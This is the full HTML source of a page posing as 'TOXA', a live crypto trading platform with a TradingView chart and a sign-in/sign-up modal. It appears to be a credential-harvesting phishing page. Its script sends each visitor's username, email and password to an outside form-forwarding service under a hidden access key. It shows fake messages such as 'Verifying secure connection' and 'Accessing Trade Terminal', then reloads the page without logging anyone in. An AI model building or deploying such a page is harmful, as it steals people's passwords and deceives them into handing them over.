<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOXA | Live Trading Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-black: #0a0a0a;
            --accent-yellow: #f5c518;
            --card-dark: #121212;
            --text-white: #ffffff;
            --text-gray: #a1a1a1;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: var(--bg-black);
            color: var(--text-white);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            top: -10%;
            right: -5%;
            width: 700px;
            height: 700px;
            background: radial-gradient(circle, rgba(245, 197, 24, 0.08) 0%, rgba(0,0,0,0) 70%);
            z-index: -1;
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 8%;
            border-bottom: 1px solid #1a1a1a;
        }

        .logo { font-size: 26px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
        .logo-icon { width: 22px; height: 22px; background: var(--accent-yellow); clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%); }

        .btn-sm-ghost { background: #1a1a1a; border: 1px solid #333; color: white; padding: 10px 20px; border-radius: 10px; cursor: pointer; font-weight: 600; }
        .btn-sm-gold { background: linear-gradient(180deg, #ffe44d 0%, #f5c518 100%); border: none; color: black; padding: 10px 22px; border-radius: 10px; cursor: pointer; font-weight: 700; transition: 0.2s; }

        .hero { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 40px 5%; }
        h1 { font-size: clamp(2.5rem, 5vw, 3.5rem); font-weight: 800; line-height: 1.1; margin-bottom: 15px; }
        .highlight { background: var(--accent-yellow); color: black; padding: 0 10px; border-radius: 6px; }

        .chart-wrapper { width: 100%; max-width: 1100px; background: #161616; padding: 15px; border-radius: 24px; border: 1px solid #222; box-shadow: 0 40px 80px rgba(0,0,0,0.8); margin: 30px 0; height: 500px; }
        #tradingview_widget { width: 100%; height: 100%; border-radius: 12px; overflow: hidden; }

        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.92);
            display: none; 
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 24px;
            width: 90%;
            max-width: 400px;
            border: 1px solid #333;
            text-align: center;
            position: relative;
        }

        .modal-content h2 { margin-bottom: 25px; font-size: 1.8rem; font-weight: 800; }
        .modal-content input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            background: #000;
            border: 1px solid #333;
            border-radius: 12px;
            color: white;
            outline: none;
            font-size: 16px;
        }
        
        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 28px; cursor: pointer; color: var(--text-gray); }

        /* Status Message Styling */
        #form-status { margin-top: 15px; font-size: 14px; font-weight: 600; }

        .tab-bar { background: rgba(255,255,255,0.04); padding: 6px; border-radius: 18px; display: flex; gap: 5px; border: 1px solid rgba(255,255,255,0.1); }
        .nav-item { padding: 10px 20px; border-radius: 12px; font-size: 13px; font-weight: 600; color: var(--text-gray); cursor: pointer; }
        .nav-item.active { background: #222; color: white; }

    </style>
</head>
<body>

    <div class="modal-overlay" id="authModal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeModal()">&times;</span>
            <h2 id="modalTitle">Access <span style="color:var(--accent-yellow)">TOXA</span></h2>
            
            <form id="authForm">
                <input type="hidden" name="access_key" value="362faa5b-d2bc-4c2d-9ac3-861b07e15dba">
                
                <input type="text" name="Username" id="userField" placeholder="Username" required>
                <input type="email" name="Email" id="emailField" placeholder="Email Address" required>
                <input type="password" name="Password" placeholder="Password" required>
                
                <button type="submit" id="submitBtn" class="btn-sm-gold" style="width: 100%; padding: 15px; font-size: 16px;">Continue to Trade</button>
                <div id="form-status"></div>
            </form>
        </div>
    </div>

    <nav>
        <div class="logo"><div class="logo-icon"></div>toxa</div>
        <div class="nav-right">
            <button class="btn-sm-ghost" onclick="openModal('Sign In')">Sign in</button>
            <button class="btn-sm-gold" onclick="openModal('Sign Up')">Sign up</button>
        </div>
    </nav>

    <div class="hero">
        <h1>Trade <span class="highlight">easily</span> and conveniently</h1>
        <div class="chart-wrapper"><div id="tradingview_widget"></div></div>
        <div class="tab-bar">
            <div class="nav-item active">Start</div>
            <div class="nav-item">Benefits</div>
            <div class="nav-item">Payment</div>
            <div class="nav-item">Blog</div>
            <div class="nav-item">Reviews</div>
        </div>
    </div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        function openModal(type) { 
            document.getElementById('modalTitle').innerHTML = type + ' to <span style="color:var(--accent-yellow)">TOXA</span>';
            document.getElementById('authModal').style.display = 'flex'; 
        }
        function closeModal() { document.getElementById('authModal').style.display = 'none'; }

        // IMPROVED SUBMISSION LOGIC
        const form = document.getElementById('authForm');
        const status = document.getElementById('form-status');
        const btn = document.getElementById('submitBtn');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            btn.disabled = true;
            btn.innerText = "Processing...";
            status.innerText = "Verifying secure connection...";

            const formData = new FormData(form);
            const object = Object.fromEntries(formData);
            const json = JSON.stringify(object);

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: json
            })
            .then(async (response) => {
                let json = await response.json();
                if (response.status == 200) {
                    status.style.color = "#4CAF50";
                    status.innerText = "Success! Accessing Trade Terminal...";
                    setTimeout(() => { window.location.reload(); }, 2000);
                } else {
                    status.style.color = "#ff4444";
                    status.innerText = "Security Check Failed. Please check your email and verify your Web3Forms key.";
                    btn.disabled = false;
                    btn.innerText = "Continue to Trade";
                }
            })
            .catch(error => {
                status.style.color = "#ff4444";
                status.innerText = "Network Error. Try again.";
                btn.disabled = false;
            });
        });

        new TradingView.widget({
            "autosize": true, "symbol": "BINANCE:BTCUSDT", "interval": "D", "timezone": "Etc/UTC",
            "theme": "dark", "style": "1", "locale": "en", "container_id": "tradingview_widget"
        });
    </script>
</body>
</html>
